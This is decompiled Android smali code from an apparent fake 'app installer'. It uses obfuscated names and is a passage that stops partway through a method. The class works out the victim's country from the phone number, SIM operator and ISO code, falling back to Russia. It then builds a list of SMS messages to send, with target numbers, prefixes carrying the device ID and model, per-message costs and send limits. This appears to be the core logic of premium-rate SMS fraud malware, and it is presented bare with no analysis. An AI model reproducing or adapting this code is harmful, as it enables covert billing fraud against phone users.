.class public Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;
.super Ljava/lang/Object;
.source "aPABkyrwq.java"


# static fields
.field private static buildInfo:Ljava/lang/String;

.field private static tag:Ljava/lang/String;


# instance fields
.field private calculatedLocation:Ljava/lang/String;

.field private context:Landroid/content/Context;

.field locations:Ljava/util/List;
.annotation system Ldalvik/annotation/Signature;
value = {
"Ljava/util/List",
"<",
"Ljava/lang/String;",
">;"
}
.end annotation
.end field

.field private prefixesByMCCMNC:Ljava/util/ArrayList;
.annotation system Ldalvik/annotation/Signature;
value = {
"Ljava/util/ArrayList",
"<",
"Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aad9b4593;",
">;"
}
.end annotation
.end field

.field private prefixesByNumber:Ljava/util/ArrayList;
.annotation system Ldalvik/annotation/Signature;
value = {
"Ljava/util/ArrayList",
"<",
"Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aad9b4593;",
">;"
}
.end annotation
.end field

.field private smsInfo:Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

.field private tm:Landroid/telephony/TelephonyManager;


# direct methods
.method static constructor <clinit>()V
.locals 1

const-string v0, "Internals"

sput-object v0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->tag:Ljava/lang/String;

const-string v0, "APPINSTALLER.ANDROID.1206.02"

sput-object v0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->buildInfo:Ljava/lang/String;

return-void
.end method

.method public constructor <init>(Landroid/content/Context;)V
.locals 1

invoke-direct {p0}, Ljava/lang/Object;-><init>()V

const/4 v0, 0x0

iput-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->calculatedLocation:Ljava/lang/String;

iput-object p1, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->context:Landroid/content/Context;

const-string v0, "phone"

invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

move-result-object v0

check-cast v0, Landroid/telephony/TelephonyManager;

iput-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->tm:Landroid/telephony/TelephonyManager;

new-instance v0, Ljava/util/ArrayList;

invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

iput-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->prefixesByNumber:Ljava/util/ArrayList;

new-instance v0, Ljava/util/ArrayList;

invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

iput-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->prefixesByMCCMNC:Ljava/util/ArrayList;

invoke-direct {p0}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->init()V

return-void
.end method

.method private calculateLocation()V
.locals 8

invoke-direct {p0}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getPhone()Ljava/lang/String;

move-result-object v3

sget-object v5, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->tag:Ljava/lang/String;

new-instance v6, Ljava/lang/StringBuilder;

invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

const-string v7, "getPhone()="

invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v6

invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v6

invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

move-result-object v6

invoke-static {v5, v6}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

invoke-direct {p0}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getSimOperator()Ljava/lang/String;

move-result-object v2

sget-object v5, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->tag:Ljava/lang/String;

new-instance v6, Ljava/lang/StringBuilder;

invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

const-string v7, "getSimOperator()="

invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v6

invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v6

invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

move-result-object v6

invoke-static {v5, v6}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

if-eqz v3, :cond_2

const/4 v0, 0x0

:goto_0
iget-object v5, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->prefixesByNumber:Ljava/util/ArrayList;

invoke-virtual {v5}, Ljava/util/ArrayList;->size()I

move-result v5

if-ge v0, v5, :cond_2

iget-object v5, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->prefixesByNumber:Ljava/util/ArrayList;

invoke-virtual {v5, v0}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

move-result-object v5

check-cast v5, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aad9b4593;

invoke-virtual {v5}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aad9b4593;->getPrefix()Ljava/lang/String;

move-result-object v5

invoke-virtual {v3, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

move-result v5

if-eqz v5, :cond_1

iget-object v5, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->prefixesByNumber:Ljava/util/ArrayList;

invoke-virtual {v5, v0}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

move-result-object v5

check-cast v5, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aad9b4593;

invoke-virtual {v5}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aad9b4593;->getName()Ljava/lang/String;

move-result-object v4

invoke-direct {p0, v4}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->isConfigurationForLocation(Ljava/lang/String;)Z

move-result v5

if-eqz v5, :cond_1

iput-object v4, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->calculatedLocation:Ljava/lang/String;

sget-object v5, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->tag:Ljava/lang/String;

new-instance v6, Ljava/lang/StringBuilder;

invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

const-string v7, "Calculated location by PHONE: "

invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v6

iget-object v7, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->calculatedLocation:Ljava/lang/String;

invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v6

invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

move-result-object v6

invoke-static {v5, v6}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

:cond_0
:goto_1
return-void

:cond_1
add-int/lit8 v0, v0, 0x1

goto :goto_0

:cond_2
const/4 v0, 0x0

:goto_2
iget-object v5, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->prefixesByMCCMNC:Ljava/util/ArrayList;

invoke-virtual {v5}, Ljava/util/ArrayList;->size()I

move-result v5

if-ge v0, v5, :cond_4

iget-object v5, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->prefixesByMCCMNC:Ljava/util/ArrayList;

invoke-virtual {v5, v0}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

move-result-object v5

check-cast v5, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aad9b4593;

invoke-virtual {v5}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aad9b4593;->getPrefix()Ljava/lang/String;

move-result-object v5

invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

move-result v5

if-eqz v5, :cond_3

iget-object v5, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->prefixesByMCCMNC:Ljava/util/ArrayList;

invoke-virtual {v5, v0}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

move-result-object v5

check-cast v5, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aad9b4593;

invoke-virtual {v5}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aad9b4593;->getName()Ljava/lang/String;

move-result-object v4

invoke-direct {p0, v4}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->isConfigurationForLocation(Ljava/lang/String;)Z

move-result v5

if-eqz v5, :cond_3

iput-object v4, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->calculatedLocation:Ljava/lang/String;

sget-object v5, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->tag:Ljava/lang/String;

new-instance v6, Ljava/lang/StringBuilder;

invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

const-string v7, "Calculated location by MCCMNC: "

invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v6

iget-object v7, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->calculatedLocation:Ljava/lang/String;

invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v6

invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

move-result-object v6

invoke-static {v5, v6}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

goto :goto_1

:cond_3
add-int/lit8 v0, v0, 0x1

goto :goto_2

:cond_4
invoke-direct {p0}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getSimCountryIso()Ljava/lang/String;

move-result-object v1

invoke-direct {p0, v1}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->isConfigurationForLocation(Ljava/lang/String;)Z

move-result v5

if-eqz v5, :cond_5

iput-object v1, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->calculatedLocation:Ljava/lang/String;

sget-object v5, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->tag:Ljava/lang/String;

new-instance v6, Ljava/lang/StringBuilder;

invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

const-string v7, "Calculated location by COUNTRY ISO: "

invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v6

iget-object v7, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->calculatedLocation:Ljava/lang/String;

invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v6

invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

move-result-object v6

invoke-static {v5, v6}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

goto :goto_1

:cond_5
invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;

move-result-object v5

const-string v6, "country"

const-string v7, "ru"

invoke-virtual {v5, v6, v7}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getValue(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

move-result-object v1

invoke-direct {p0, v1}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->isConfigurationForLocation(Ljava/lang/String;)Z

move-result v5

if-eqz v5, :cond_6

iput-object v1, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->calculatedLocation:Ljava/lang/String;

sget-object v5, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->tag:Ljava/lang/String;

new-instance v6, Ljava/lang/StringBuilder;

invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

const-string v7, "Calculated location by RESCUE COUNTRY ISO: "

invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v6

iget-object v7, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->calculatedLocation:Ljava/lang/String;

invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v6

invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

move-result-object v6

invoke-static {v5, v6}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

goto/16 :goto_1

:cond_6
const-string v1, "ru"

invoke-direct {p0, v1}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->isConfigurationForLocation(Ljava/lang/String;)Z

move-result v5

if-eqz v5, :cond_0

iput-object v1, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->calculatedLocation:Ljava/lang/String;

sget-object v5, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->tag:Ljava/lang/String;

new-instance v6, Ljava/lang/StringBuilder;

invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

const-string v7, "Calculated location by SUPER RESCUE COUNTRY ISO: "

invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v6

iget-object v7, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->calculatedLocation:Ljava/lang/String;

invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v6

invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

move-result-object v6

invoke-static {v5, v6}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

goto/16 :goto_1
.end method

.method private fillSmsInfo()V
.locals 22

sget-object v19, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->tag:Ljava/lang/String;

const-string v20, "fillSmsInfo()"

invoke-static/range {v19 .. v20}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

new-instance v19, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

invoke-direct/range {v19 .. v19}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;-><init>()V

move-object/from16 v0, v19

move-object/from16 v1, p0

iput-object v0, v1, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->smsInfo:Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

move-object/from16 v0, p0

iget-object v9, v0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->calculatedLocation:Ljava/lang/String;

if-nez v9, :cond_1

:cond_0
return-void

:cond_1
new-instance v19, Ljava/lang/StringBuilder;

invoke-direct/range {v19 .. v19}, Ljava/lang/StringBuilder;-><init>()V

const-string v20, "smsCount_"

invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v19

move-object/from16 v0, v19

invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v19

invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

move-result-object v19

const-string v20, "0"

move-object/from16 v0, p0

move-object/from16 v1, v19

move-object/from16 v2, v20

invoke-direct {v0, v1, v2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getParam(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

move-result-object v19

invoke-static/range {v19 .. v19}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

move-result v15

new-instance v19, Ljava/lang/StringBuilder;

invoke-direct/range {v19 .. v19}, Ljava/lang/StringBuilder;-><init>()V

const-string v20, "dcSmsCount_"

invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v19

move-object/from16 v0, v19

invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v19

invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

move-result-object v19

const-string v20, "0"

move-object/from16 v0, p0

move-object/from16 v1, v19

move-object/from16 v2, v20

invoke-direct {v0, v1, v2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getParam(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

move-result-object v19

invoke-static/range {v19 .. v19}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

move-result v5

new-instance v19, Ljava/lang/StringBuilder;

invoke-direct/range {v19 .. v19}, Ljava/lang/StringBuilder;-><init>()V

const-string v20, "totalSmsCount_"

invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v19

move-object/from16 v0, v19

invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v19

invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

move-result-object v19

const-string v20, "0"

move-object/from16 v0, p0

move-object/from16 v1, v19

move-object/from16 v2, v20

invoke-direct {v0, v1, v2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getParam(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

move-result-object v19

invoke-static/range {v19 .. v19}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

move-result v18

new-instance v19, Ljava/lang/StringBuilder;

invoke-direct/range {v19 .. v19}, Ljava/lang/StringBuilder;-><init>()V

const-string v20, "sumLimit_"

invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v19

move-object/from16 v0, v19

invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v19

invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

move-result-object v19

const v20, 0x7fffffff

invoke-static/range {v20 .. v20}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

move-result-object v20

move-object/from16 v0, p0

move-object/from16 v1, v19

move-object/from16 v2, v20

invoke-direct {v0, v1, v2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getParam(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

move-result-object v19

invoke-static/range {v19 .. v19}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

move-result v17

invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;

move-result-object v19

const-string v20, "id"

invoke-virtual/range {v19 .. v20}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getValue(Ljava/lang/String;)Ljava/lang/String;

move-result-object v7

move-object/from16 v0, p0

iget-object v0, v0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->smsInfo:Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

move-object/from16 v19, v0

move-object/from16 v0, v19

invoke-virtual {v0, v15}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;->setSmsCount(I)V

move-object/from16 v0, p0

iget-object v0, v0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->smsInfo:Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

move-object/from16 v19, v0

move-object/from16 v0, v19

invoke-virtual {v0, v5}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;->setDcSmsCount(I)V

move-object/from16 v0, p0

iget-object v0, v0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->smsInfo:Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

move-object/from16 v19, v0

move-object/from16 v0, v19

move/from16 v1, v17

invoke-virtual {v0, v1}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;->setSumLimit(I)V

const/4 v6, 0x1

:goto_0
move/from16 v0, v18

if-gt v6, v0, :cond_4

const-string v19, "number"

const-string v20, ""

move-object/from16 v0, p0

move-object/from16 v1, v19

move-object/from16 v2, v20

invoke-virtual {v0, v1, v6, v2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getNValueForLocation(Ljava/lang/String;ILjava/lang/String;)Ljava/lang/String;

move-result-object v11

const-string v19, "prefix"

const-string v20, ""

move-object/from16 v0, p0

move-object/from16 v1, v19

move-object/from16 v2, v20

invoke-virtual {v0, v1, v6, v2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getNValueForLocation(Ljava/lang/String;ILjava/lang/String;)Ljava/lang/String;

move-result-object v12

const-string v19, "suffix"

const-string v20, ""

move-object/from16 v0, p0

move-object/from16 v1, v19

move-object/from16 v2, v20

invoke-virtual {v0, v1, v6, v2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getNValueForLocation(Ljava/lang/String;ILjava/lang/String;)Ljava/lang/String;

move-result-object v16

new-instance v19, Ljava/lang/StringBuilder;

invoke-direct/range {v19 .. v19}, Ljava/lang/StringBuilder;-><init>()V

sget-object v20, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v19

sget-object v20, Landroid/os/Build;->MODEL:Ljava/lang/String;

invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v19

invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

move-result-object v10

if-nez v10, :cond_2

const-string v10, "unknown-model"

:cond_2
invoke-virtual {v10}, Ljava/lang/String;->length()I

move-result v8

const/16 v19, 0x14

move/from16 v0, v19

if-le v8, v0, :cond_3

const/16 v8, 0x14

:cond_3
const/16 v19, 0x0

move/from16 v0, v19

invoke-virtual {v10, v0, v8}, Ljava/lang/String;->substring(II)Ljava/lang/String;

move-result-object v10

const-string v19, "true"

const-string v20, "DC"

const-string v21, "false"

move-object/from16 v0, p0

move-object/from16 v1, v20

move-object/from16 v2, v21

invoke-virtual {v0, v1, v6, v2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getNValueForLocation(Ljava/lang/String;ILjava/lang/String;)Ljava/lang/String;

move-result-object v20

invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

move-result v4

const-string v19, "cost"

const-string v20, "0"

move-object/from16 v0, p0

move-object/from16 v1, v19

move-object/from16 v2, v20

invoke-virtual {v0, v1, v6, v2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getNValueForLocation(Ljava/lang/String;ILjava/lang/String;)Ljava/lang/String;

move-result-object v19

invoke-static/range {v19 .. v19}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

move-result v3

new-instance v14, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e$a4cecb21b;

new-instance v19, Ljava/lang/StringBuilder;

invoke-direct/range {v19 .. v19}, Ljava/lang/StringBuilder;-><init>()V

move-object/from16 v0, v19

invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v19

const-string v20, " "

invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v19

move-object/from16 v0, v19

invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v19

const-string v20, " none "

invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v19

move-object/from16 v0, v19

invoke-virtual {v0, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v19

const-string v20, " "

invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v19

sget-object v20, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->buildInfo:Ljava/lang/String;

invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v19

const-string v20, " "

invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v19

move-object/from16 v0, v19

move-object/from16 v1, v16

invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

move-result-object v19

invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

move-result-object v19

move-object/from16 v0, v19

invoke-direct {v14, v11, v0, v3}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e$a4cecb21b;-><init>(Ljava/lang/String;Ljava/lang/String;I)V

move-object/from16 v0, p0

iget-object v0, v0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->smsInfo:Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

move-object/from16 v19, v0

move-object/from16 v0, v19

invoke-virtual {v0, v14, v4}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;->addSms(Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e$a4cecb21b;Z)V

add-int/lit8 v6, v6, 0x1

goto/16 :goto_0

:cond_4
move-object/from16 v0, p0

iget-object v0, v0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->smsInfo:Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

move-object/from16 v19, v0

invoke-virtual/range {v19 .. v19}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;->sort()V

const/4 v6, 0x1

:goto_1
const-string v19, "alert"

const/16 v20, 0x0

move-object/from16 v0, p0

move-object/from16 v1, v19

move-object/from16 v2, v20

invoke-virtual {v0, v1, v6, v2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->getNValueForLocation(Ljava/lang/String;ILjava/lang/String;)Ljava/lang/String;

move-result-object v13

if-eqz v13, :cond_0

move-object/from16 v0, p0

iget-object v0, v0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->smsInfo:Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

move-object/from16 v19, v0

move-object/from16 v0, v19

invoke-virtual {v0, v13}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;->addAlert(Ljava/lang/String;)V

add-int/lit8 v6, v6, 0x1

goto :goto_1
.end method

.method private getParam(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
.locals 1

invoke-static {}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getInstance()Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;

move-result-object v0

invoke-virtual {v0, p1, p2}, Lcom/adc58a797/ac31b3236/a740675ee/a1f5d5cb0;->getValue(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

move-result-object v0

return-object v0
.end method

.method private getPhone()Ljava/lang/String;
.locals 2

iget-object v1, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->tm:Landroid/telephony/TelephonyManager;

invoke-virtual {v1}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

move-result-object v0

if-eqz v0, :cond_0

const-string v1, ""

invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

move-result v1

if-eqz v1, :cond_1

:cond_0
const/4 v1, 0x0

:goto_0
return-object v1

:cond_1
const-string v1, "+"

invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

move-result v1

if-eqz v1, :cond_2

const/4 v1, 0x1

invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

move-result-object v0

:cond_2
move-object v1, v0

goto :goto_0
.end method

.method private getSimCountryIso()Ljava/lang/String;
.locals 1

iget-object v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/a68724f62;->tm:Landroid/telephony/TelephonyManager;

invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSimCountryIso()Ljava/lang/String;

move-result-object v0

return-object v0
.end method

.method private getSimOperator()Ljava/lang/String;
.locals 1

